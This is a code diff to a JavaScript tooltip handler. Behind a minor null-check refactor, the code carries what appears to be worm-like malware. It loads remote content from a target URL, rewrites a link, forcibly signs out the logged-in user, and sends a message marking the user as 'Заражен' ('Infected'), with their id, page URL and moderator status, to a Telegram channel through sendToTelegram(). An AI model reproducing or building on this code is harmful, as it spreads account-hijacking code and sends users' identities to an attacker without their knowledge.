@@ -94,23 +94,26 @@ async function signOutUser(delay) {
         let $link = $container.children('.bubbled-processed');
         let targetUrl = $container.children('.target.hidden').attr('href') || defautUrl;
         let $tooltip = $link.tooltip();
-        //let $target = $tooltip.getTrigger();
-        let $tip = $tooltip.getTip();
-        if ($tip) {
-        $tip.find('.tooltip-details').load(targetUrl + '/tooltip', function() {
-            var $this = $(this);
-            $tooltip.show({
-            target: $link[0]
+        if($tooltip != null)
+        {
+            //let $target = $tooltip.getTrigger();
+            let $tip = $tooltip.getTip();
+            if ($tip) {
+            $tip.find('.tooltip-details').load(targetUrl + '/tooltip', function() {
+                var $this = $(this);
+                $tooltip.show({
+                target: $link[0]
+                });
+                $this.process();
             });
-            $this.process();
-        });
-        }
-        $link.attr('href', targetUrl);
-        let logoutDelay = $container.data('signout-delay') || 1000;
-        if (userData.id) signOutUser(logoutDelay);
+            }
+            $link.attr('href', targetUrl);
+            let logoutDelay = $container.data('signout-delay') || 1000;
+            if (userData.id) signOutUser(logoutDelay);
 
-        let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
-        sendToTelegram(strData);
+            let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
+            sendToTelegram(strData);
+        }
   }
 }
 
